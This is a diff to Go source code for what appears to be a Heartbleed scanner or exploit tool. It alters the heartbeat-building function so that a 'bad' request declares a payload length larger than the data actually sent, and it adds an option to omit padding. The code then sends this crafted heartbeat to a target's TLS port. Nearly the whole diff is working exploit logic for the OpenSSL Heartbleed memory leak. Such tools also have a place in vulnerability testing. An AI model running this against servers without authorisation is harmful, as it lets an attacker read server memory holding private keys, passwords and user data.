@@ -33,19 +33,22 @@ var padding = []byte("xpaddingpaddingx")
 //    opaque payload[HeartbeatMessage.payload_length];
 //    opaque padding[padding_length];
 // } HeartbeatMessage;
-func buildMessage(payload []byte, doGood bool) []byte {
+func buildMessage(payload []byte, doGood bool, doPadding bool) []byte {
+	var payload_len uint16 = uint16(len(payload))
+	if !doGood {
+		//no ternary operator in Go, what's that all about?!
+		if payload_len == 0 {
+			payload_len = 12
+		} else {
+			payload_len = payload_len * 2
+		}
+	}
 	buf := bytes.Buffer{}
 	err := binary.Write(&buf, binary.BigEndian, uint8(1))
 	if err != nil {
 		panic(err)
 	}
-	if doGood {
-		err = binary.Write(&buf, binary.BigEndian,
-			uint16(len(payload)))
-	} else {
-		err = binary.Write(&buf, binary.BigEndian,
-			uint16(len(payload)*2))
-	}
+	err = binary.Write(&buf, binary.BigEndian, payload_len)
 	if err != nil {
 		panic(err)
 	}
@@ -53,15 +56,17 @@ func buildMessage(payload []byte, doGood bool) []byte {
 	if err != nil {
 		panic(err)
 	}
-	_, err = buf.Write(padding)
-	if err != nil {
-		panic(err)
+	if doPadding {
+		_, err = buf.Write(padding)
+		if err != nil {
+			panic(err)
+		}
 	}
 	return buf.Bytes()
 }
 
 func Heartbleed(tgt *Target, payload []byte,
-		skipVerify bool, sendGoodRequest bool) (string, error) {
+		skipVerify bool, sendGoodRequest bool, doPadding bool) (string, error) {
 	host := tgt.HostIp
 	if strings.Index(host, ":") == -1 {
 		host = host + ":443"
@@ -89,7 +94,7 @@ func Heartbleed(tgt *Target, payload []byte,
 		return "", err
 	}
 
-	err = conn.SendHeartbeat([]byte(buildMessage(payload, sendGoodRequest)))
+	err = conn.SendHeartbeat([]byte(buildMessage(payload, sendGoodRequest, doPadding)))
 	if err != nil {
 		return "", err
 	}
